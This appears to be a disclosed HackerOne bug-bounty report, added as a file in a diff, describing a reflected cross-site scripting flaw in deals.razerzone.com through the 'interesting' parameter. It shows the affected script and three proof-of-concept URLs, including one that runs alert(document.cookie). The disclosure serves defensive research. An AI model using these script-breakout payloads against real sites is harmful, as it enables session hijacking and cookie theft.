@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/272211
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/edoverflow
+ReportedTo:Razer US(razer_us)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:08.11.2017 19:38:58
+
+Summary:
+
+# Summary
+---
+
+deals.razerzone.com is vulnerable to Reflected XSS via the `interesting` parameter.
+
+# Affected Code
+---
+
+```html
+<script>
+	var ThisPageOn = "recommended",
+	    pageNum = 2,
+	    isLoading = false,
+	    delIntresItem = 0,
+	    delNotIntresItem = 0,
+	    delOwnedItem = 0,
+	    intres = -1 abba < /script><script>alert(1)</script > ;
+	var ownedLang = "OWNED",
+	    ownThislang = "I OWN THIS";
+	$(function() {
+	    Recommended.init();
+	});
+</script>
+```
+
+# Browsers Verified In
+---
+
+* Google Chrome 60.0.3112.113 (Official Build) (64-bit)
+* Mozilla Firefox 55.0.2 (64-bit)
+
+# PoC
+---
+
+https://deals.razerzone.com/not-interested?interesting=-1abba%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+
+https://deals.razerzone.com/not-interested?interesting=-1abba%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+
+https://deals.razerzone.com/not-interested?interesting=-1abba%3C/script%3E%3Ciframe+src=%22javascript:alert(1)%%0D3C!--
+
+{F224260}
+
+{F224261}
